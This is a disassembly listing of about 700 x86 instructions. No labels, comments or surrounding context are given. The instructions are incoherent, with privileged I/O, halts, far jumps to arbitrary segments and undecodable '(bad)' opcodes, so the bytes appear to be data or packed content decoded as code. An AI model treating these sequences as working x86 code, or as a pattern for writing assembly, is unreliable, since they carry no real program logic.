  419b24:	adc    al,0xb3
  419b26:	mov    al,0xef
  419b28:	push   cs
  419b29:	out    0xe4,al
  419b2b:	inc    esi
  419b2c:	sahf   
  419b2d:	cmp    ch,dl
  419b2f:	sub    ebp,DWORD PTR [eax]
  419b31:	pop    esi
  419b32:	lahf   
  419b33:	pop    ds
  419b34:	xchg   DWORD PTR [ecx+eiz*2-0x19ef3fde],esi
  419b3b:	pop    ds
  419b3c:	mov    ds:0x85c71e79,al
  419b41:	out    0xb1,eax
  419b43:	jle    0x419b31
  419b45:	iret   
  419b46:	push   esi
  419b47:	repz aad 0x2d
  419b4a:	pop    edx
  419b4b:	sub    al,0x40
  419b4d:	loopne 0x419b35
  419b4f:	mov    esi,0xc4af33d6
  419b54:	dec    edi
  419b55:	adc    al,0x60
  419b57:	add    DWORD PTR [ebp+0x3c],edx
  419b5a:	dec    edi
  419b5b:	test   BYTE PTR [edx+esi*8+0x13],ch
  419b5f:	hlt    
  419b60:	leave  
  419b61:	fimul  WORD PTR [eax]
  419b63:	nop/reserved BYTE PTR [edi+edi*4-0x48077034]
  419b6b:	cmp    eax,0x44e8bb25
  419b70:	ror    DWORD PTR [edi],cl
  419b72:	mov    ecx,0xe6d81fb0
  419b77:	push   ds
  419b78:	in     eax,dx
  419b79:	xchg   DWORD PTR [esi],esp
  419b7b:	sub    edi,0x86797f4
  419b81:	ret    0x9c6b
  419b84:	inc    ecx
  419b85:	rcl    BYTE PTR [esi+eiz*2],1
  419b88:	data16 mov cl,ch
  419b8b:	sti    
  419b8c:	int3   
  419b8d:	add    DWORD PTR [ebp-0x1a709bdb],ecx
  419b93:	pop    eax
  419b94:	adc    eax,0xc751e4e5
  419b99:	rol    BYTE PTR [edi+0x63],0x48
  419b9d:	scas   al,BYTE PTR es:[edi]
  419b9e:	ret    0x19b8
  419ba1:	push   ebp
  419ba2:	push   0x40
  419ba4:	scas   al,BYTE PTR es:[edi]
  419ba5:	sub    eax,0xe22d0661
  419baa:	ret    0x9b78
  419bad:	pause  
  419baf:	ja     0x419b47
  419bb1:	outs   dx,BYTE PTR ds:[esi]
  419bb2:	dec    esi
  419bb3:	jecxz  0x419b5d
  419bb5:	sub    ch,al
  419bb7:	pusha  
  419bb8:	sub    DWORD PTR [ecx-0x3d],edi
  419bbb:	ja     0x419b59
  419bbd:	pop    sp
  419bbf:	sbb    ah,BYTE PTR [edi-0x22919e49]
  419bc5:	dec    edi
  419bc6:	dec    edx
  419bc7:	xchg   ebx,eax
  419bc8:	gs jecxz 0x419bd3
  419bcb:	jns    0x419c34
  419bcd:	jo     0x419b80
  419bcf:	dec    cl
  419bd1:	syscall 
  419bd3:	cmp    al,0x77
  419bd5:	mov    ecx,DWORD PTR [edi]
  419bd7:	or     BYTE PTR [ecx-0x2f86a1ce],0xf5
  419bde:	pop    es
  419bdf:	push   edi
  419be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419be1:	fcomip st,st(1)
  419be3:	jo     0x419c58
  419be5:	sub    eax,0x74b67dd5
  419bea:	loopne 0x419bcd
  419bec:	test   eax,esi
  419bee:	pand   mm5,QWORD PTR [ecx]
  419bf1:	jl     0x419bce
  419bf3:	xor    al,0x45
  419bf5:	xchg   ecx,eax
  419bf6:	je     0x419c70
  419bf8:	cld    
  419bf9:	inc    edx
  419bfa:	shl    BYTE PTR [esi-0x2d],1
  419bfd:	mov    esi,0x2854840e
  419c02:	jmp    0x319b:0x21781e7b
  419c09:	je     0x419c85
  419c0b:	push   ss
  419c0c:	add    al,0xbb
  419c0e:	push   es
  419c0f:	mov    es,WORD PTR [ecx]
  419c11:	adc    esi,DWORD PTR [edx+0x2d]
  419c14:	dec    esp
  419c15:	sub    al,0x49
  419c17:	jo     0x419bbe
  419c19:	or     eax,0x7f21b040
  419c1e:	out    0x21,al
  419c20:	and    dl,BYTE PTR [ebx]
  419c22:	or     ebx,DWORD PTR [edx]
  419c24:	pop    edi
  419c25:	push   ds
  419c26:	adc    BYTE PTR [ebp+0x3abbf235],ah
  419c2c:	(bad)  
  419c2d:	in     eax,0x4
  419c2f:	mov    dh,0xc3
  419c31:	inc    ebp
  419c32:	scas   eax,DWORD PTR es:[edi]
  419c33:	ror    DWORD PTR [eax+0x27d761aa],0x51
  419c3a:	popf   
  419c3b:	push   0x7b
  419c3d:	xchg   esi,eax
  419c3e:	mov    esp,0x5a92e4e3
  419c43:	and    eax,0xff51078
  419c48:	sbb    DWORD PTR [eax],edi
  419c4a:	jmp    0x419bfb
  419c4c:	mov    eax,0xee104d9d
  419c51:	pop    esp
  419c52:	xchg   ebx,eax
  419c53:	add    eax,0x77106057
  419c58:	cld    
  419c59:	xchg   esi,eax
  419c5b:	push   ss
  419c5c:	das    
  419c5d:	sbb    DWORD PTR [edx],eax
  419c5f:	pushf  
  419c60:	mov    ecx,0x915c5770
  419c65:	and    esi,DWORD PTR [ebx+0x42]
  419c68:	int3   
  419c69:	fisubr DWORD PTR [ebx]
  419c6b:	inc    BYTE PTR ds:0xfc2fa639
  419c71:	sbb    BYTE PTR [ebx-0x31],dh
  419c74:	jg     0x419c68
  419c76:	dec    ecx
  419c77:	fwait
  419c78:	push   ecx
  419c79:	test   BYTE PTR [edi+ebp*1+0x74],ah
  419c7d:	adc    eax,0x8c2fba99
  419c82:	mov    edi,DWORD PTR [ecx]
  419c84:	idiv   BYTE PTR ds:0xc6dd9169
  419c8a:	jbe    0x419cba
  419c8c:	dec    edi
  419c8d:	sti    
  419c8e:	sahf   
  419c8f:	sub    eax,0x579451cd
  419c95:	dec    esp
  419c96:	bound  edi,QWORD PTR [ebp+0x1a]
  419c99:	loopne 0x419c64
  419c9b:	outs   dx,DWORD PTR ds:[esi]
  419c9c:	push   esp
  419c9d:	sub    BYTE PTR [ecx],ch
  419c9f:	sub    edi,eax
  419ca1:	outs   dx,DWORD PTR ds:[esi]
  419ca2:	scas   eax,DWORD PTR es:[edi]
  419ca3:	popf   
  419ca4:	mov    ebp,0x64c4fceb
  419ca9:	leave  
  419caa:	cmp    BYTE PTR [edx-0x24],0x4b
  419cae:	lods   al,BYTE PTR ds:[esi]
  419caf:	mov    ds:0x27639fcd,al
  419cb4:	mov    ebp,0x1b80fe72
  419cb9:	or     eax,0xb55a2a3e
  419cbe:	aad    0xfc
  419cc0:	xor    esi,DWORD PTR [esi]
  419cc2:	inc    ebx
  419cc3:	jg     0x419c8b
  419cc5:	mov    al,0x46
  419cc7:	cld    
  419cc8:	xchg   BYTE PTR [eax],dh
  419cca:	xchg   edi,eax
  419ccb:	ins    DWORD PTR es:[edi],dx
  419ccc:	xor    BYTE PTR [ecx],0xe
  419ccf:	cmpxchg esi,edx
  419cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cd3:	jne    0x419cee
  419cd5:	int3   
  419cd6:	mov    ch,0x2f
  419cd8:	or     al,0x70
  419cda:	or     DWORD PTR [ecx-0x51],ecx
  419cdd:	sti    
  419cde:	or     al,0xef
  419ce0:	cli    
  419ce1:	leave  
  419ce2:	dec    ebp
  419ce3:	in     al,0xe1
  419ce5:	imul   ebp,ebx,0x24
  419ce8:	inc    di
  419cea:	hlt    
  419ceb:	mov    ecx,DWORD PTR [edi+0x5cc9a804]
  419cf1:	or     esp,DWORD PTR [eax+0x64fee084]
  419cf7:	cmp    DWORD PTR [ecx],ecx
  419cf9:	and    al,0x69
  419cfb:	stos   BYTE PTR es:[edi],al
  419cfc:	mov    dl,0x9b
  419cfe:	jg     0x419c8f
  419d00:	test   DWORD PTR [eax],edx
  419d02:	adc    DWORD PTR [esi+esi*1],edi
  419d05:	jl     0x419cc2
  419d07:	pop    ds
  419d08:	xor    eax,0xdf4d6c04
  419d0d:	mov    eax,0xe5897bde
  419d12:	inc    edx
  419d13:	iret   
  419d14:	sub    DWORD PTR [edi],0xffffff9f
  419d17:	loopne 0x419cfd
  419d19:	push   ds
  419d1a:	pop    esi
  419d1b:	sub    eax,ecx
  419d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d1e:	popa   
  419d1f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d21:	repz push ss
  419d23:	add    ebp,edi
  419d25:	lods   al,BYTE PTR ds:[esi]
  419d26:	std    
  419d27:	jmp    0x86b9f3d2
  419d2c:	add    eax,0xef14eeea
  419d31:	js     0x419ccc
  419d33:	sub    BYTE PTR [ebx+0x5efe7d52],dl
  419d39:	in     al,0x96
  419d3b:	lods   al,BYTE PTR ds:[esi]
  419d3c:	jo     0x419d9b
  419d3e:	jge    0x419d13
  419d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d41:	stos   BYTE PTR es:[edi],al
  419d42:	and    edx,DWORD PTR [eax]
  419d44:	sbb    bh,BYTE PTR [eax+ecx*8]
  419d47:	imul   eax,DWORD PTR [ecx+edx*4-0x38],0x5
  419d4c:	int3   
  419d4d:	sub    BYTE PTR [ecx+0x2b79f163],0x61
  419d54:	ins    DWORD PTR es:[edi],dx
  419d55:	jmp    0x462f:0x411c4219
  419d5c:	call   0x2dd0:0x7637ac5c
  419d63:	aam    0xca
  419d65:	and    BYTE PTR [ebx+esi*8+0x20d8fbfb],dh
  419d6c:	fldenv [esp+esi*8+0xbb92dd2]
  419d73:	cmp    eax,0x18087772
  419d78:	shl    DWORD PTR [eax+0x5db1c440],0xa8
  419d7f:	les    edx,FWORD PTR ds:[ebx+0x64]
  419d83:	clc    
  419d84:	dec    edx
  419d85:	and    eax,0xd05b64af
  419d8a:	add    BYTE PTR [edi+0x444b107a],dl
  419d90:	adc    BYTE PTR [eax],bl
  419d92:	retf   
  419d93:	test   al,0xb7
  419d95:	mov    esi,0xe9fb103d
  419d9a:	test   al,0x67
  419d9c:	jb     0x419df8
  419d9e:	test   al,0x4d
  419da0:	push   ds
  419da1:	out    0x9f,al
  419da3:	scas   eax,DWORD PTR es:[edi]
  419da4:	dec    edx
  419da5:	adc    BYTE PTR [ebp-0x782f4890],0x20
  419dac:	arpl   si,ax
  419dae:	popa   
  419daf:	mov    bh,0xb7
  419db1:	jne    0x419d4b
  419db3:	stos   DWORD PTR es:[edi],eax
  419db4:	push   0x4f
  419db6:	adc    eax,0x3141e0db
  419dbb:	pop    ebp
  419dbc:	mov    cl,0x77
  419dbe:	inc    esp
  419dbf:	push   eax
  419dc0:	push   ebx
  419dc1:	xchg   ebx,eax
  419dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dc3:	ficomp WORD PTR [ecx]
  419dc5:	mov    BYTE PTR [edi-0x13b2ce4f],dl
  419dcb:	out    0xc2,eax
  419dcd:	and    al,0xaf
  419dcf:	add    eax,0x841d430a
  419dd4:	imul   DWORD PTR [ecx-0x19714026]
  419dda:	sbb    DWORD PTR [ecx+0x2803b269],edx
  419de0:	rcl    esp,cl
  419de2:	add    dh,dl
  419de4:	or     ecx,edx
  419de6:	cld    
  419de7:	xor    DWORD PTR [esp+ebp*1],ecx
  419dea:	cmp    esp,esp
  419dec:	push   ebp
  419ded:	lea    esp,[esi]
  419def:	rol    BYTE PTR [esi],1
  419df1:	pop    edi
  419df2:	int3   
  419df3:	sar    DWORD PTR [edi+0x7e],0xa3
  419df7:	into   
  419df8:	lods   al,BYTE PTR ds:[esi]
  419df9:	arpl   WORD PTR [ebx],bp
  419dfb:	and    dl,bh
  419dfd:	sbb    al,0xdd
  419dff:	hlt    
  419e00:	push   edx
  419e01:	repnz int3 
  419e03:	pushf  
  419e04:	push   esp
  419e05:	pop    ecx
  419e06:	es add esp,esp
  419e09:	in     al,0xd1
  419e0b:	and    dl,cl
  419e0d:	push   ecx
  419e0e:	jmp    0x74814afc
  419e13:	(bad)  
  419e14:	jge    0x419e65
  419e16:	sbb    eax,0x65e783e6
  419e1b:	jnp    0x419dbf
  419e1d:	xor    ebp,ecx
  419e1f:	(bad)  
  419e20:	and    eax,0xfa22ad74
  419e25:	mov    edx,0x3a34793a
  419e2a:	jb     0x419e1f
  419e2c:	jo     0x419e5e
  419e2e:	enter  0x87ff,0xac
  419e32:	scas   eax,DWORD PTR es:[edi]
  419e33:	ficomp WORD PTR [esi+0xcb9d6dc]
  419e39:	jb     0x419e94
  419e3b:	jecxz  0x419e86
  419e3d:	mov    ds:0xd3ac95b8,al
  419e42:	aas    
  419e43:	jo     0x419ea1
  419e45:	out    dx,al
  419e46:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419e48:	xchg   bx,ax
  419e4a:	push   ebp
  419e4b:	(bad)  
  419e4c:	aam    0x57
  419e4e:	mov    edi,0x88e0612
  419e53:	inc    ebp
  419e54:	jns    0x419dfd
  419e56:	cli    
  419e57:	pop    cx
  419e59:	pop    es
  419e5a:	mov    DWORD PTR [edx+0x5],edx
  419e5d:	cmp    BYTE PTR [edi-0x93c9a26],dh
  419e63:	jae    0x419e21
  419e65:	inc    ebp
  419e66:	mov    BYTE PTR [esi-0x36],dh
  419e69:	cmp    DWORD PTR [eax+0x3ebdf686],ebp
  419e6f:	push   ecx
  419e70:	push   esp
  419e71:	loop   0x419ed0
  419e73:	aad    0x5e
  419e75:	jg     0x419e76
  419e77:	sbb    esi,DWORD PTR [eax]
  419e79:	mov    al,BYTE PTR [esi]
  419e7b:	les    esp,FWORD PTR [ecx+eiz*1]
  419e7e:	ss sbb edx,0x98df4161
  419e85:	jo     0x419e41
  419e87:	xchg   esi,eax
  419e88:	mov    bh,0x8
  419e8a:	je     0x419eca
  419e8c:	loop   0x419e9c
  419e8e:	pop    ebp
  419e8f:	pop    ss
  419e90:	iret   
  419e91:	xchg   ecx,eax
  419e92:	icebp  
  419e93:	xchg   BYTE PTR [edi],bh
  419e95:	hlt    
  419e96:	es (bad) 
  419e98:	mov    ecx,0x4cfa5b90
  419e9d:	lock sub eax,0xf9cb8ef4
  419ea3:	sbb    DWORD PTR [ebp+0x64],0xfffffff8
  419ea7:	mov    esi,cs
  419ea9:	dec    ecx
  419eaa:	ret    0x5070
  419ead:	(bad)  
  419eae:	loope  0x419e62
  419eb0:	inc    BYTE PTR [ecx-0x3e]
  419eb3:	das    
  419eb4:	lea    ecx,[ecx+0x27]
  419eb7:	fnstsw WORD PTR [edi]
  419eb9:	in     eax,dx
  419eba:	push   es
  419ebb:	mov    BYTE PTR [edi+0x3a1d5783],dh
  419ec1:	and    dh,BYTE PTR [edi+0x21c4f5]
  419ec7:	push   esi
  419ec8:	push   ss
  419ec9:	or     al,0x5b
  419ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ecc:	daa    
  419ecd:	in     al,0x6e
  419ecf:	cwde   
  419ed0:	shl    ebx,0x16
  419ed3:	inc    BYTE PTR [edi-0x4d79678f]
  419ed9:	push   ebx
  419eda:	cmp    DWORD PTR [eax],esi
  419edc:	pop    ecx
  419edd:	dec    ecx
  419ede:	imul   esp,DWORD PTR [ebp+0x4e],0x78
  419ee2:	cmp    BYTE PTR [ebx+0x13873443],bh
  419ee8:	retf   0xd412
  419eeb:	mov    ds:0x323e9a41,eax
  419ef0:	shl    DWORD PTR [edi],cl
  419ef2:	jns    0x419f17
  419ef4:	dec    esi
  419ef5:	cmp    BYTE PTR [eax-0x7a],dh
  419ef8:	lea    ecx,[edi+edi*1-0x5119a116]
  419eff:	stc    
  419f00:	inc    esi
  419f01:	fcomp  DWORD PTR [eax+0x62]
  419f04:	loop   0x419f05
  419f06:	ficomp DWORD PTR [eax]
  419f08:	xchg   esp,eax
  419f09:	loopne 0x419f15
  419f0b:	sub    si,WORD PTR [esi]
  419f0e:	mov    ah,bh
  419f10:	out    dx,eax
  419f11:	rcl    BYTE PTR [ebp+0xb9cf8fa],0xa8
  419f18:	mov    cl,0xa6
  419f1a:	mov    edi,0x835055d1
  419f1f:	sbb    BYTE PTR [ebp-0x6b],bl
  419f22:	jnp    0x419f56
  419f24:	xor    BYTE PTR [eax+0x6e],dh
  419f27:	inc    eax
  419f28:	repz in al,0xd
  419f2b:	inc    esi
  419f2c:	sbb    ebx,edx
  419f2e:	ror    DWORD PTR [edx+0x29],cl
  419f31:	jne    0x419efd
  419f33:	fsub   DWORD PTR [ebx]
  419f35:	mov    eax,0xaad6ceb9
  419f3a:	mov    esi,0xdd1138d8
  419f3f:	mov    dl,0xa8
  419f41:	popa   
  419f42:	push   edx
  419f43:	ins    DWORD PTR es:[edi],dx
  419f44:	adc    DWORD PTR [edi+0x7ad893ed],eax
  419f4a:	dec    esi
  419f4b:	out    dx,eax
  419f4c:	cmp    al,0xdc
  419f4e:	rcr    DWORD PTR [ecx-0x63ba0b6f],0xf4
  419f55:	dec    ecx
  419f56:	out    dx,al
  419f57:	fs retf 0xfc3b
  419f5b:	cld    
  419f5c:	pop    ecx
  419f5d:	mov    ecx,0x808502d8
  419f62:	xlat   BYTE PTR ds:[ebx]
  419f63:	arpl   WORD PTR [eax],bx
  419f65:	sbb    esp,esi
  419f67:	std    
  419f68:	leave  
  419f69:	sub    DWORD PTR [esi-0x6c],edx
  419f6c:	adc    al,0xe9
  419f6e:	pop    eax
  419f6f:	adc    BYTE PTR ds:0x629eb723,0xb7
  419f76:	jp     0x419f39
  419f78:	and    BYTE PTR [ebx+0x5a9494d5],0x38
  419f7f:	ins    DWORD PTR es:[edi],dx
  419f80:	push   esp
  419f81:	pop    ds
  419f82:	cli    
  419f83:	ins    BYTE PTR es:[edi],dx
  419f84:	mov    cs,esi
  419f86:	mov    al,0xfa
  419f88:	xchg   esi,eax
  419f89:	fnstcw WORD PTR [eax+0x73eafdfd]
  419f8f:	mov    bh,0x72
  419f91:	dec    esp
  419f92:	sbb    esp,DWORD PTR [ebx-0x56]
  419f95:	lods   eax,DWORD PTR ds:[esi]
  419f96:	xchg   edi,eax
  419f97:	inc    edi
  419f98:	test   esi,0xac1fff32
  419f9e:	fld    DWORD PTR [ecx+0x5]
  419fa1:	(bad)  
  419fa2:	iret   
  419fa3:	pop    esp
  419fa4:	call   0x5e37:0x653ca1b9
  419fab:	mov    edi,DWORD PTR [ebx-0x33d8c2fe]
  419fb1:	in     eax,dx
  419fb2:	lock lahf 
  419fb4:	push   eax
  419fb5:	loop   0x419f93
  419fb7:	sbb    ebp,ecx
  419fb9:	ror    BYTE PTR [edx+edi*1+0x63],0xdb
  419fbe:	mov    bl,BYTE PTR [edi+ebx*4]
  419fc1:	or     cl,ch
  419fc3:	(bad)  
  419fc5:	sbb    eax,0x76b7f080
  419fca:	xchg   esp,eax
  419fcb:	and    eax,ecx
  419fcd:	jmp    0x42ba3504
  419fd2:	mov    ebx,0x443fb4b
  419fd7:	mov    ecx,0x4b812d1a
  419fdc:	mov    edx,0xd8dce13b
  419fe1:	jmp    esi
  419fe3:	inc    eax
  419fe4:	cmp    DWORD PTR [esi-0x7a819664],ebp
  419fea:	mov    esp,0x42aeb7e2
  419fef:	adc    BYTE PTR [edx+0x1246fbcd],ch
  419ff5:	jmp    0x419fc0
  419ff7:	ins    BYTE PTR es:[edi],dx
  419ff8:	xor    dl,dh
  419ffa:	or     edi,edi
  419ffc:	mov    al,ds:0x35a524bc
  41a001:	jae    0x41a04b
  41a003:	xchg   DWORD PTR [ebx],edi
  41a005:	cdq    
  41a006:	sub    al,0x24
  41a008:	dec    ebx
  41a009:	mov    al,0xdf
  41a00b:	stos   DWORD PTR es:[edi],eax
  41a00c:	mov    ds:0x20455a03,eax
  41a011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a012:	dec    ecx
  41a013:	dec    esp
  41a014:	inc    esp
  41a015:	lods   eax,DWORD PTR ds:[esi]
  41a016:	inc    esp
  41a017:	mov    ecx,0x855d6f3
  41a01c:	(bad)
  41a01f:	or     eax,0xf11b834
  41a024:	push   ds
  41a025:	idiv   DWORD PTR [edi]
  41a027:	sub    bl,bh
  41a029:	pop    esi
  41a02a:	retf   0x8f41
  41a02d:	leave  
  41a02e:	fimul  WORD PTR [esi-0x1ec48058]
  41a034:	inc    edi
  41a035:	rol    BYTE PTR [esp+edx*2-0x7d9e2dc3],0x5c
  41a03d:	mov    esp,0x330d8d68
  41a042:	enter  0xfdbb,0x48
  41a046:	out    0x45,eax
  41a048:	adc    al,0xdb
  41a04a:	xchg   edx,eax
  41a04b:	mov    DWORD PTR [edi-0x257c2f03],edi
  41a051:	test   eax,0x58531cbc
  41a056:	popa   
  41a057:	(bad)  
  41a058:	repnz test BYTE PTR [ebp-0x51],dl
  41a05c:	push   DWORD PTR [ebx+0x24]
  41a05f:	sub    DWORD PTR [ecx+edx*2-0x6d],0xffffffc4
  41a064:	inc    eax
  41a065:	ja     0x41a01f
  41a067:	dec    ecx
  41a068:	xor    ch,BYTE PTR [esi+0x9]
  41a06b:	mov    bl,0xa2
  41a06d:	mov    edi,DWORD PTR [esi-0x41]
  41a070:	test   BYTE PTR [edx-0x7e6e94cd],cl
  41a076:	mov    ecx,0xf5f4af40
  41a07b:	xchg   DWORD PTR [esi-0x50],ebx
  41a07e:	test   edi,esi
  41a080:	scas   eax,DWORD PTR es:[edi]
  41a081:	mov    edx,0x4f09e9d1
  41a086:	jno    0x41a105
  41a088:	push   esp
  41a089:	sti    
  41a08a:	sbb    DWORD PTR [edx],ebx
  41a08c:	fnstenv [esi-0x49]
  41a08f:	pop    ss
  41a090:	std    
  41a091:	xor    al,0x99
  41a093:	and    bl,ah
  41a095:	lock int3 
  41a097:	jae    0x41a0c2
  41a099:	fsubr  st(6),st
  41a09b:	add    BYTE PTR [ecx-0x1b6c7d5b],0xe2
  41a0a2:	xchg   ebp,eax
  41a0a3:	pusha  
  41a0a4:	jl     0x41a07d
  41a0a6:	stos   BYTE PTR es:[edi],al
  41a0a7:	popa   
  41a0a8:	popf   
  41a0a9:	push   ss
  41a0aa:	inc    eax
  41a0ab:	out    0x45,eax
  41a0ad:	fs scas eax,DWORD PTR es:[di]
  41a0b0:	loop   0x41a125
  41a0b2:	push   ebp
  41a0b3:	mov    eax,ds:0x12b1c95f
  41a0b8:	add    BYTE PTR ss:[edi],dl
  41a0bb:	push   eax
  41a0bc:	jne    0x41a100
  41a0be:	cdq    
  41a0bf:	xchg   ecx,eax
  41a0c0:	sub    ah,BYTE PTR [ebp+0x6dc889f8]
  41a0c6:	nop
  41a0c7:	cs push ss
  41a0c9:	sbb    DWORD PTR [ebx+0x47],edi
  41a0cc:	push   ebp
  41a0cd:	xor    eax,0x767e2c4
  41a0d2:	sub    al,0x5a
  41a0d5:	inc    esp
  41a0d6:	xchg   edx,eax
  41a0d7:	mov    ebp,0xcf6dccdd
  41a0dc:	adc    eax,0x4538d3be
  41a0e1:	aas    
  41a0e2:	or     dl,al
  41a0e4:	jmp    0x585082f6
  41a0e9:	push   ds
  41a0ea:	xchg   ebp,eax
  41a0eb:	es out 0x68,eax
  41a0ee:	jmp    0x6ec8f079
  41a0f3:	ja     0x41a08f
  41a0f5:	int    0xa4
  41a0f7:	push   0xe007ef10
  41a0fc:	arpl   bx,bp
  41a0fe:	ss mov ebp,0xf08f4b1
  41a104:	xchg   esi,eax
  41a105:	pushf  
  41a106:	scas   eax,DWORD PTR es:[edi]
  41a107:	cs popf 
  41a109:	aad    0x59
  41a10b:	jle    0x41a181
  41a10d:	xchg   DWORD PTR [eax+0x25],ebp
  41a110:	pusha  
  41a111:	pop    esi
  41a112:	jo     0x41a0e6
  41a114:	and    eax,0xc96c58ec
  41a119:	leave  
  41a11a:	hlt    
  41a11b:	loopne 0x41a0de
  41a11d:	test   al,0x8f
  41a11f:	(bad)  
  41a120:	adc    al,BYTE PTR [eax-0x1ddf9119]
  41a126:	sub    edx,eax
  41a128:	ins    BYTE PTR es:[edi],dx
  41a129:	inc    ebp
  41a12a:	aad    0xa6
  41a12c:	lea    edx,[ebx+0x39]
  41a12f:	mov    esp,0x14ac1ea2
  41a134:	jmp    0x2e7b:0x3b54f3fb
  41a13b:	sub    al,0x9
  41a13d:	fwait
  41a13e:	mov    al,BYTE PTR [edx+0x788896fc]
  41a144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a145:	mov    ?,WORD PTR [ebx-0x56589dcc]
  41a14b:	(bad)  
  41a14c:	scas   al,BYTE PTR es:[edi]
  41a14d:	xchg   edx,eax
  41a14e:	xchg   BYTE PTR [ecx+0x27],ch
  41a151:	inc    esp
  41a152:	xchg   edi,eax
  41a153:	pop    esi
  41a154:	ja     0x41a14d
  41a156:	fstp   QWORD PTR [edi+eax*4+0x5b46b1e3]
  41a15d:	es push ebx
  41a15f:	sub    ebx,DWORD PTR [edx+0x27]
  41a162:	xor    ebp,DWORD PTR [ebx-0xe318180]
  41a168:	loope  0x41a19a
  41a16a:	test   eax,0x325421ae
  41a16f:	ins    BYTE PTR es:[edi],dx
  41a170:	pop    esp
  41a171:	push   ecx
  41a172:	repnz popa 
  41a174:	sub    ah,BYTE PTR [ebx-0x5a243f45]
  41a17a:	pop    ebp
  41a17b:	inc    eax
  41a17c:	sahf   
  41a17d:	xor    eax,0xbc271fd
  41a182:	cmp    ebp,DWORD PTR [esi+0x7f4fdf37]
  41a188:	leave  
  41a189:	sub    esi,DWORD PTR ds:0xd1b99c8e
  41a18f:	inc    edx
  41a190:	out    dx,al
  41a191:	iret   
  41a192:	xor    esp,DWORD PTR [edi+esi*2]
  41a195:	ret    
  41a196:	pop    ecx
  41a197:	fstp   TBYTE PTR [esi+0x9]
  41a19a:	ins    DWORD PTR es:[edi],dx
  41a19b:	push   0xffffffaa
  41a19d:	mov    esi,0xeb1861b
  41a1a2:	or     BYTE PTR [edx],dh
  41a1a4:	xor    ecx,DWORD PTR [eax+0x51b3938a]
  41a1aa:	repnz add DWORD PTR [ebx+0x530be83e],ebx
  41a1b1:	jmp    0x294d:0x75c232d6
  41a1b8:	cmp    al,0x9b
  41a1ba:	call   0x458f:0xda4e12da
  41a1c1:	fdiv   QWORD PTR es:[eax-0x65]
  41a1c5:	jecxz  0x41a175
  41a1c7:	shl    bl,cl
  41a1c9:	ins    DWORD PTR es:[edi],dx
  41a1ca:	push   esi
  41a1cb:	mov    ebx,0x4b8327bc
  41a1d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1d1:	mov    ah,0xdb
  41a1d3:	stos   BYTE PTR es:[edi],al
  41a1d4:	fincstp 
  41a1d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1d7:	out    0x2f,al
  41a1d9:	fisub  WORD PTR [ebx+0x73f4573c]
  41a1df:	mov    WORD PTR [edx+edi*2-0x4dbfbb73],fs
  41a1e6:	pop    ss
  41a1e7:	push   ebx
  41a1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1e9:	or     DWORD PTR ds:0x6e01d5f,esp
  41a1ef:	pop    edx
  41a1f0:	les    eax,FWORD PTR [edi+0x1]
  41a1f3:	xlat   BYTE PTR ds:[ebx]
  41a1f4:	sub    al,0xb0
  41a1f6:	jmp    0x7a49:0x97936719
  41a1fd:	pop    es
  41a1fe:	fdivr  QWORD PTR [eax+0xfb9868c]
  41a204:	call   0x5174:0x39caf062
  41a20b:	or     BYTE PTR [eax-0x64],ch
  41a20e:	cmp    eax,0xa079d38a
  41a213:	ret    
  41a214:	xchg   ebp,eax
  41a215:	sub    edx,edi
  41a217:	leave  
  41a218:	and    BYTE PTR [esi],dh
  41a21a:	shl    BYTE PTR [ecx-0x7e6f78ce],cl
  41a220:	lock aad 0x67
  41a223:	push   0x43
  41a225:	outs   dx,DWORD PTR ds:[esi]
  41a226:	mov    al,0xd5
  41a228:	mov    DWORD PTR [ecx+0x5e506251],edi
  41a22e:	rcr    al,1
  41a230:	popa   
  41a231:	jmp    0x8844:0x3806f862
  41a238:	lods   eax,DWORD PTR ds:[esi]
  41a239:	js     0x41a28a
  41a23b:	stos   DWORD PTR es:[edi],eax
  41a23c:	out    0x44,al
  41a23e:	sbb    eax,0xb9db574c
  41a243:	mov    WORD PTR [ebx+0x144efdde],?
  41a249:	ds into 
  41a24b:	fild   DWORD PTR [ecx+0x62d16133]
  41a251:	sbb    bh,BYTE PTR [ebp+ebx*4+0x1c]
  41a255:	jg     0x41a274
  41a257:	push   eax
  41a258:	sbb    BYTE PTR [ebp-0x10],bh
  41a25b:	inc    ebp
  41a25c:	cmp    eax,0x876c4f61
  41a261:	cmp    eax,0x9ace62fd
  41a266:	shl    BYTE PTR [eax-0xa],0xf8
  41a26a:	jb     0x41a260
  41a26c:	sbb    ebx,DWORD PTR [edi]
  41a26e:	fsubr  DWORD PTR [ecx-0x35a227e7]
  41a274:	jmp    0xb78e7b59
  41a279:	dec    ecx
  41a27a:	sbb    BYTE PTR [esi+0x53543627],dh
  41a280:	inc    ebp
  41a281:	add    esi,ecx
  41a283:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41a285:	out    0x44,eax
  41a287:	lods   al,BYTE PTR ds:[si]
  41a289:	(bad)  
  41a28a:	in     al,0xbc
  41a28c:	bound  ebx,QWORD PTR [ebx]
  41a28e:	addr16 jmp 0xb579:0x149b05db
  41a296:	jb     0x41a265
  41a298:	imul   eax,DWORD PTR [esp+eax*8],0xffffffe5
  41a29c:	imul   ebp,DWORD PTR [edx+0x3b],0x37
  41a2a0:	push   ds
  41a2a1:	add    dh,bl
  41a2a3:	enter  0x696,0xc1
  41a2a7:	sbb    al,0x73
  41a2a9:	mov    al,0x99
  41a2ab:	adc    BYTE PTR [eax+0x3d],cl
  41a2ae:	mov    eax,ds:0xce420ca7
  41a2b3:	adc    ah,BYTE PTR [ecx]
  41a2b5:	data16 cmp bl,bh
  41a2b8:	xchg   edx,eax
  41a2b9:	rcl    BYTE PTR [edx],0x7e
  41a2bc:	sub    DWORD PTR [ebx+0x690a1b79],esi
